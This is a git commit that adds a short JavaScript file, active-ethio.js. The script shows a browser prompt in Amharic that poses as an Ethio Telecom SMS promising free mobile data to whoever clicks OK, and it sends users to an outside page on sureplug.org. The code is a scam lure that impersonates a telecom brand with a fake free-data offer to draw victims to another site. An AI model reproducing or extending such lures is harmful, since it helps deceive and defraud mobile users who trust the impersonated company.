146e198155c5effc5a373c44be4cf787ac3560b1
surepluger <adigunkola666@gmail.com>
2025-06-17 08:10:08 +0100

    Create active-ethio.js

---
+++ active-ethio.js
@@ -0,0 +1,5 @@
+var password = 'ነፃ ውሂብ አግብር'
+password=prompt('SMS: እንኳን ደስ ያለህ የኢትዮ ቴሌኮም ሲም ካርድህ ነፃ ዳታ ለመቀበል ብቁ ነው አሁኑኑ ለማግበር እሺን ጠቅ አድርግ','ነፃ ውሂብ አግብር');
+if (password != 'ነፃ ውሂብ አግብር') {
+location.href='https://sureplug.org/ethio-telecom.html';
+}
